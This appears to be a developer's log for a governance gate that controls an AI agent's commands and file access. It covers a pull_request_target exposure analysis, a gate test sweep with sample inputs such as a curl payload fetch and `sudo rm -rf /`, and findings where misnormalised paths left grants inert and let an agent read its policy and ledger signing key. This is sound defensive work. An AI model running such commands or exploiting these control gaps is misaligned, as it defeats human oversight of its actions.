`REMAINING-WORK.md` said, in bold: **"Do not make the repository public to get
unlimited minutes. It holds unpublished academic work."**

That sentence is struck rather than deleted, because the argument in it was
sound and the decision was taken against it knowingly, and for a different
reason than the one it addresses. The minutes were never why. **The record
should show a decision, not a tidied-away disagreement.**

### The good consequence: the runbook lost its only manual step

`LINUX-INSTALL.md` §1 existed entirely because the clone needed credentials:
generate a deploy key on the VPS, register it on GitHub, write an SSH config,
test the connection. It is listed in the task table as item **f**, "yours to
execute", and it was the only setup step in the whole runbook that a person had
to perform by hand **on two machines**.

It is now a section to skip. The clone is `git clone https://github.com/...`
with no key, no SSH config and no credentials. The deploy-key procedure is kept,
collapsed behind a disclosure, because if the repository ever goes private again
it is the right procedure and deleting it would mean rediscovering it.

**That matters more than it sounds** with T47 and T2 both waiting on people
getting onto a server.

### The consequence to know about: what a public repository makes reachable

Minutes stop mattering on a public repository. Something else starts.

**`pull_request` and `pull_request_target` workflows were unreachable while the
repository was private, because a stranger could not open a pull request.** Now
they can, and this fork inherited **82 upstream workflow files**, of which
**six use `pull_request_target`**: `auto-response`, `clawsweeper-dispatch`,
`dependency-guard`, `labeler`, `real-behavior-proof` and
`security-sensitive-guard`. That trigger is the standard privilege-escalation
vector on a public repository, because it runs with the _base_ repository's
permissions and secrets while the pull request's code is the untrusted part.

**Measured, not assumed, and the answer is reassuring.** The dangerous shape is
`pull_request_target` **plus a checkout of the pull request's head** — that is
what lets a stranger's code run with your token. **None of the six checks out
the head.** Five reference GitHub App private keys that exist only in upstream's
repository and are absent here, which is the same reason the earlier note gives
for every inherited workflow failing. A stranger's pull request would start
them, they would fail immediately for want of secrets, and no attacker-supplied
code would execute.

**So: bounded, and no change needed today.** What it needs is to be _known_.
"We inherited 82 workflows and disabled Actions" was a billing decision on
2026-08-22 and is now also a security one, and anybody who re-enables Actions
later to get CI back will re-enable those six along with everything else.

### And a stale claim found while checking it

**T21 records Actions as disabled on 2026-08-22**, proved by a billing curve
falling $12.29 → $0.98 → under a cent. The API disagrees on 2026-09-04: every
workflow reports `state: "active"`, there are **425 runs**, and **9 to 10 land
every day without a break from 2026-08-23 to today**, scheduled ones among them.

Both observations are true and the write-up drew too wide a conclusion from
one. What the billing curve actually proved is that **the hourly sweeper
stopped** — it was ~720 runs a month and the dominant consumer. The scheduled
and Dependabot runs never stopped; they are few enough and fail fast enough to
cost nothing measurable, so the billing page could not see them and the
conclusion "Actions are disabled" was never tested against anything else.

**The same shape this project keeps finding**: a measurement that supports a
narrower claim than the sentence written beside it. It was harmless while the
repository was private. It is worth knowing now that it is not.

---

## 2026-09-04 (night): the gate swept, and a folder grant that grants nothing

**A second sweep, on a deliberately different axis.** `feature-sweep.ts` that
afternoon exercised the **stores and the state** — accounts, the policy
document, the request queue, the ledger file — and never once asked the question
the project exists to answer: _what happens when an agent tries to do
something._ `gate-sweep.ts` drives `evaluateGovernancePolicy` itself.
**Seventeen checks.** Sixteen confirm the gate does what it claims. The
seventeenth is **finding 253**.

### What the gate got right

Quoted, because the wording is the product as much as the decision is:

- **Default-deny holds.** `curl https://example.com/payload.sh` is unlisted and
  is escalated to a human rather than run.
- **Core denials fire with an explanation naming the rule**: _"command
  `sudo rm -rf /` is refused by a core-tier deny rule (Privilege escalation
  (sudo, su, doas, runas, pkexec)). Core rules cannot be overridden by policy."_
- **The layer refuses the agent its own policy file**, by relative path, which
  is the self-protection the core tier exists for.
- **A deny outranks an allow on the identical pattern.**
- **The kill switch reaches the gate**: a locked-down agent is refused a command
  it was explicitly permitted, and works again on release.
- **Mandatory registration (M5)**: _"agent `ghost-agent` is not in the agent
  registry, so no policy applies to it. An Administrator must register it before
  it can act."_ No fallback rulebook, which is the hole M5 closed.
- **Requirement 8's other half**: three planted secrets — a `--password=`, an
  `--api-key=` and a URL credential — are all masked before the ledger.
- **Monitor observes without refusing; Enforce refuses again.**
- **Requirement 5**: the refusals were _recorded_, not merely returned.

**One of the two initial failures was the check, not the product**, and it is
worth naming because it is the same trap as the layout test measuring the wrong
edge. A path climbing out of a granted folder came back **escalated**, and the
assertion demanded **blocked**. Escalation is the _correct_ default-deny outcome
for a resource no rule mentions, and the check's own file accepts exactly that
answer for an unlisted command twelve lines earlier. What must not happen is
`ALLOWED`; the assertion now says so.

### Finding 253: a folder grant on an absolute path writes two inert rules

**The other failure was real.** Granting a folder by absolute path, with an
exception inside it, produced `ALLOWED` for the exception — the path the grant
exists to protect.

**The mechanism.** `FolderGrantInput` carries a `cwd` field, documented in the
type as _"Workspace root, so a relative path normalises the way the gate will
read it"_. **Neither production caller passes it**: not
`governance-dashboard-folder-grant.ts`, not
`register.governance.policy.ts`. So `normalizeGovernedPath(folder, undefined)`
falls back to the **process** cwd — wherever the Gateway or the operator's shell
happens to be — while the gate normalises against the **agent's** workspace from
`HookContext.cwd`.

The grant writes `^C:/Users/…/projects/secrets(/|$)`. The gate asks about
`projects/secrets/prod.key`. Neither the allowance nor the exception matches,
and the agent is governed by neither.

**The module's own header states the invariant this breaks**, which is what
makes it a finding rather than a limitation:

> Paths are normalised through the same function the gate uses, so what an
> operator types and what the rule matches cannot disagree.

They can disagree, because the function takes a second argument that decides the
answer and no caller supplies it. **A parameter that exists precisely to keep
two halves in agreement, with no production caller passing it** — the same shape
as a capability with no affordance (239) and a type-level guard written in a
test file, which is to say the thing is present and inert.

**Why it is worse than an ordinary silent failure.** The panel lists the two
rules back to the operator under _"Written as separate rules:"_, and that
display exists on purpose, so that "these are ordinary rules you can remove one
at a time" is demonstrated rather than claimed. Here it demonstrates a
protection that is not in force. The operator does not get nothing; they get an
authoritative-looking confirmation of nothing.

**Relative paths work correctly**, which is both the mitigation and the reason
this survived: the form's placeholder asks for one (_"e.g. src"_), the tests use
one, and `work` + `work/secrets` behaves exactly as T32 promises — _"path
`work/secrets/prod.key` is refused by a admin-tier deny rule (Exception to the
grant on work: work/secrets)"_. Nothing that has ever been typed in testing took
the broken path.

**Not fixed, and deliberately.** The correct `cwd` at grant time is a design
question rather than an oversight to patch: an agent-scoped grant could use that
agent's workspace, but a **global** grant binds every agent, and those have
different workspaces, so there is no single root to normalise against and an
absolute path may be the only coherent expression — except that an absolute path
is exactly what cannot match. Choosing between "resolve per agent", "refuse an
absolute path at authoring time with an explanation", and "make the pattern
position-independent the way the core rules are" is a product decision. **T54.**

It is pinned in `gate-sweep.ts` as a check that asserts the **current** behaviour
and says so in its own name, so that fixing it turns the check red and forces
the comment to be revisited, rather than leaving a silent pass behind.

**How it was found is the reusable part.** Not by reading `folder-grant.ts`,
which has been read several times and whose comments are careful and correct
about everything except this. By granting a folder and then _asking the gate_
whether the exception held.

---

## 2026-09-04 (late): T54 answered with a fifth option, and 254 underneath it

**Kinan asked for more options than the four in the decision document, then for
the most thorough one to be built.** Brainstorming produced a fifth that none of
the first four had reached, and building it exposed a security defect in the
self-protecting core tier that nobody was looking for.

### The four options, and why none of them was the answer

**Written up for the team as `docs-notes/T54-DECISION.md` and deleted once the
decision was taken; the four options are folded in here so the reasoning
survives the file.** They were:

| Option | What it was                                                                        | What it cost                                                                                                                                                                                                                                   |
| ------ | ---------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **1**  | Look up the named agent's workspace when the rule is written                       | Right for the common case, but the layer does not record an agent's workspace, it does nothing for a grant binding _every_ agent, and it freezes the rule at authoring time so an agent that later runs elsewhere silently stops being covered |
| **2**  | Refuse a path the control cannot express faithfully, and say why                   | Cheapest, removes the silent failure, takes away nothing that works — but needs to know the workspace to decide _which_ absolute paths are safe, so the honest version refuses all of them in that one control                                 |
| **3**  | Build the pattern position-independently, with `(^\|/)` as every shipped rule does | One line. **And a trap** — see below                                                                                                                                                                                                           |
| **4**  | Change nothing, write the limitation down                                          | Free, and leaves a control that confirms a protection it did not apply, which is the bug class this project calls its worst                                                                                                                    |

The recommendation was the second, on the grounds that it removes the silent
failure and costs nothing.

**Option 3 is the one worth remembering, because it is the tempting one.** Every
shipped rule anchors with `(^|/)` rather than `^`, so it matches at the start of
a path _or_ after a slash, which is exactly what would have made both spellings
work. It is a one-line change to one function.

It is also **looser than the operator asked for**: a grant on `src` would then
cover `vendor/src`, `node_modules/src`, anything ending in `/src`. Every shipped
rule using that trick is a **denial**, where matching too much is safe and
usually desirable. This control writes an **allowance**, where matching too much
hands out access nobody asked for. _Widening access to fix a matching bug is the
wrong direction to be wrong in_, and that sentence is the durable part of the
whole exercise.

**Every one of them treats the folder-grant control as the thing that is
wrong.** That framing is what kept the answer small, and it was wrong. The
control is one of _three_ places a path becomes a pattern, and the same
disagreement lives in the other two — a rule hand-written with an absolute path
in the ordinary add-rule form is inert in exactly the same way, and nobody had
noticed because nobody had written one.

### The fifth option: fix the comparison, not the writer

**A file inside the workspace has two legitimate names.** `work/secrets/key` and
`C:/Users/kinan/work/secrets/key` are the same file. The canonical form picks
one of them, and which one it picks depends on `cwd` — a property of _the
session making the call_, which the person writing the rule does not know and
cannot control.

So the defect is not "the control writes the wrong spelling". It is that **a
canonical form which varies by observer is not canonical**, and the gate was
comparing against one name while the operator had written the other.

`resolveGovernedPathForms` returns both spellings; the gate matches every rule
against both, and records the canonical one. That is four call sites: the deny
pass, the allow pass, and T7's two search-audit passes.

**Why this is the thorough answer.** It fixes folder grants, hand-written
absolute rules, and search withholding, from every surface, in one place. It
needs no new data, no migration, and nothing an operator has to know. And it
puts the repair where the ambiguity is: the gate owns "does this rule bind this
resource", and the resource had two names.

**Why it is safe, which is the part that took the longest to establish.** The
absolute form is the canonical absolute path the gate has _already resolved_ —
links followed, `..` collapsed. A rule matching it is a rule about that actual
file; there is no string reachable through this that is not the real path of the
resource being judged. And the escape-detection property is untouched, because
`getCwdRelativePath` returns `undefined` for anything outside the workspace,
rejecting `..`, `../` and absolute results outright. **An escaped path has only
one form and it is already absolute.** The one thing that would reopen the hole —
manufacturing a `..`-relative spelling — is exactly what this never does, and
there is a test asserting so.

**The option that was rejected, and the reason is worth keeping.** Building the
pattern position-independently with `(^|/)`, as every shipped rule does, is a
one-line change and was tempting. It is also _looser than the operator asked
for_: a grant on `src` would cover `vendor/src` and anything else ending in
`/src`. Every shipped rule using that trick is a **denial**, where matching too
much is safe. This control writes an **allowance**, where matching too much
hands out access nobody asked for. Widening access to fix a matching bug is the
wrong direction to be wrong in.

### Finding 254, which the fix found on its way in

Twelve tests failed the moment the fix landed, all over-blocking. The cause was
not the fix.

**There is a core denial, one of the self-protecting ones Root cannot switch
off, on "the governance directory in use".** It is generated on every load from
the live `OPENCLAW_GOVERNANCE_DIR`, so relocating the store moves the protection
with it — and it is generated **absolute**, under a comment stating the
assumption it rests on:

> absolute whenever the target is outside the workspace, which the governance
> directory always is.

It is not always. Point the store somewhere inside an agent's workspace, which
the deployment report treats as a supported configuration — it reports
`governanceDirRelocated` — and the paths become workspace-relative and **the
absolute pattern matches nothing**. The static sibling does not cover it either:
that one is `(^|/)\.openclaw/governance(/|$)`, and a relocated directory is by
definition not at that path.

**Measured, not argued** (`docs-notes/qa-sweep-2026-09-04/relocated-governance-dir.ts`),
with the fix removed and put back:

```
WITHOUT the fix                      WITH the fix
  policy.json          ALLOWED         REFUSED
  users.json           ALLOWED         REFUSED
  audit-ledger.jsonl   ALLOWED         REFUSED
  ledger.key           ALLOWED         REFUSED
```

All four. The policy the agent is governed by, the accounts, the audit trail,
and **the signing key that makes the ledger tamper-evident** — reading which
defeats requirement 8 outright, because with the key the whole chain can be
forged. The credential-file fallback does not catch `ledger.key`: that pattern
lists `.pem`, `.pfx`, `.p12` and `.keystore`, and not `.key`.

**Narrow but real.** It needs the store relocated to a path not containing
`.openclaw/governance` _and_ that path inside an agent's workspace. The default
layout is safe, because the static pattern covers it. But relocation is a
configuration this project ships a report field for.

**Why the twelve tests had been passing.** `search-filter.test.ts`,
`search-filter-hook.test.ts` and `folder-grant.test.ts` all used the governance
directory _as the agent's workspace_. No installation does that, and it was
harmless only while the rule was inert. With the rule working, an agent working
inside the policy store is correctly refused everything. The fixtures now have a
workspace of their own, which is what production has.

### Two mistakes made and caught while doing this, both the same one

**The first was in the unit test for the fix.** It added a deny rule with an
absolute pattern, read a file, and asserted `block`. It passed — and went on
passing when the fix was deliberately removed. The fixture runs `ask: "off"`,
strict default-deny, so the file was blocked whether or not any rule matched it.
True for the wrong reason. Fixed by granting the file in the _relative_ spelling
first, so `block` can only come from the absolute denial binding.

**The second was in the 254 probe, an hour later, identically.** It reported
`REFUSED` before and after the fix, and the write-up nearly claimed a defect
that the evidence did not support. Same cause, same repair: allow the path
broadly first, so the core denial is the only thing that can still refuse it.

**Mutation testing is what caught both**, and it is the only thing that could
have. Removing `forms` and re-running took seconds; three of the five new
assertions go red, and the two that do not are the negative safety ones, which
guard a different future mistake. A green suite says nothing about whether it
depends on the code.

---

## 2026-09-04 (last): the fix tested properly, three surfaces compared, and the register caught claiming something

Three things Kinan asked for after the 253/254 fix landed: test it properly,
sweep a different axis, and check that everything built recently reaches all
three surfaces. The second and third turned out to be the same task.

### The fix, tested properly rather than adequately

**It was not thoroughly tested when it was committed, and saying so is the
point.** Four call sites were changed and two were covered. The two that were
not are the search audit's — the half where a missed denial means a forbidden
file **stays in the results the model reads**, which is the worse consequence of
the two.

Neither search test file contained a single absolute rule pattern before that
day, so the whole direction was unverified. Four tests added across
`search-audit.test.ts` and `search-filter.test.ts`, one positive and one
negative each: the denial binds, and a file it does not cover is left alone, so
matching a second spelling cannot quietly widen a rule.

**Mutated in both directions, which is the only way to know.** Removing the
second spelling turns **five** assertions red across all four call sites. Adding
a `..`-relative spelling — the one thing that would reopen the traversal hole —
turns the safety assertion red. Before that second mutation the safety test
could have been inert and nothing would have said so.

Three edges were also closed: a command rule still binds and does no filesystem
work, `apply_patch`'s host-derived absolute paths bind too, and the cost was
**measured** rather than asserted (`gate-cost.ts`). A path decision and a
command decision both land near 16 ms and differ by about a millisecond; the
extra `realpath` is below the run-to-run noise, and what actually dominates a
governed call is the ledger's `fsync`. The honest phrasing is "unmeasurable
against the ledger write", not "fast".

### The parity sweep, and what it found

`docs-notes/qa-sweep-2026-09-04/surface-parity.mjs` differences the routes the
Gateway serves against the routes the dashboard calls and the commands the CLI
registers. **46 route-and-method pairs.** Nine came back as candidate gaps and
**four were false positives** — dashboard calls carrying a query string, which
is exactly the caveat the earlier capability sweep recorded and the reason this
script prints it at the top.

**Four of the five real ones were already answered**, and by the document whose
job that is: §2d of `CLI-REFERENCE.md` records creating, deleting, re-roling and
password-resetting an account as deliberately dashboard-only, with a real
argument — the dashboard's account form carries guards QA rounds put there, and
a second implementation is where two surfaces come to disagree. The sweep found
them; the register answered them. That is §2d working.

**Finding 255 is the fifth, and it has three parts.**

**Listing accounts had no command and no stated reason.** Not create, not
delete — _list_. And the absence made §2d wrong in a way that is worse than a
missing entry: the section's "what you can still do from here" named
`governance set-policy-authoring`, which takes an `<userId>`, and **nothing on
this surface could print an account id**. `organisation summary` reports counts
and the Root's username; `agents access` reports usernames. A document that
exists to say "here is the consolation for the missing capabilities" was
offering one that could not be completed without opening the dashboard.

That is finding 223's shape one layer in. 223 was a register that promised "the
reasons are here" and omitted two. This is a register **claiming** a capability
while it was unreachable.

`governance accounts` was built: Root-only and group-scoped, exactly as
`GET users` is, printing the id first because the id is the reason it exists.
Listing carries none of the divergence cost the register's argument rests on —
no confirmation field, no password rule, no role picker the server would refuse.
It is a read.

**The host resource view was the third part**, and it is not a defect. `GET
system` is dashboard-only, which is correct: `uptime`, `free` and `top` answer
the same question on a shell, better and without a governance session. It had no
entry in the register that promises to name every such case, so it read as a
gap. It has one now, and §2d's capability count goes from two to three.

### UI testing: five interactions, and one assertion that proved nothing

Layout was measured on 2026-09-04; behaviour was not. Five interaction tests
added to the browser project: a destructive control looks different from an
ordinary one, a primary action looks primary, the ledger's active filter is
visible to the eye and not only to a screen reader, a self-protecting core rule
says why it has no switch, and typing a filter that matches nothing says "no
rules match" rather than "no rules exist".

**One of them was worthless and mutation testing said so.** The check for
finding 248 compared one `.btn.danger` against one plain button. Putting the
broken spelling back in `account-panels.ts` did not turn it red, because three
other files still spelled it correctly and the selector found one of those.
It asserted "_a_ destructive control is styled" while the defect had been that
**twenty call sites across six files** used four spellings nothing defines.

Replaced with the actual invariant: **no element on the page carries any of the
four class names no stylesheet has ever defined.** Re-mutated, and that one goes
red. Every regression at every call site now fails it, which is what the
original was supposed to do.

**That is the second time in one day the same mistake was made and caught the
same way**, after the 254 probe that reported REFUSED before and after the fix.
A test that passes is not evidence that it depends on anything.
